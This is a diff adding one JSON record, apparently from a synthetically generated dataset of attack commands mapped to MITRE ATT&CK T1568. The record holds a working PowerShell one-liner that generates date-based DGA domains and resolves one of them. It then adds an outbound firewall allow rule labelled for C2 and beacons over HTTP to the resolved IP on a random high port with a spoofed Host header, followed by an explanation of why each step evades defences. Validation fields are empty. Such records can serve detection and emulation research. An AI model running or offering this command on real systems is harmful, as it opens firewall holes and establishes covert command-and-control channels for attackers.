@@ -1,0 +1,21 @@
+{
+  "technique_id": "T1568",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "$seed='pool';$date=(Get-Date -Format 'yyyyMMdd');$dlist=1..10|%{(''+$seed+$_+'.'+$date+'.com')};$d=$dlist|Get-Random;try{$a=Resolve-DnsName $d -Type A -ErrorAction Stop;$ips=$a|Select-Object -ExpandProperty IPAddress;$ip=$ips[(Get-Random -Min 0 -Max $ips.Count)];$port=(Get-Random -Min 20000 -Max 20300);netsh advfirewall firewall add rule name='c2_out_'+$port dir=out action=allow protocol=TCP remoteip=$ip remoteport=$port;Invoke-WebRequest -Uri ('http://'+$ip+':'+$port+'/k') -Headers @{Host=$d;Rand='1'} -UseBasicParsing -TimeoutSec 5}catch{}",
+  "explanation": "Builds a DGA pool, selects a current candidate and one of its A records, then communicates directly to the IP on a high, randomized port while spoofing the Host header for dynamic domain alignment.",
+  "rationale_steps": [
+    "Rotate among multiple candidate domains and their flux IPs.",
+    "Use a non-standard port and Host header to maintain domain-based routing semantics."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1568-0a23acf2-45dc1ae3",
+  "source_prompt_hash": "0a23acf2",
+  "timestamp_utc": "2025-09-30T09:39:46.357850Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
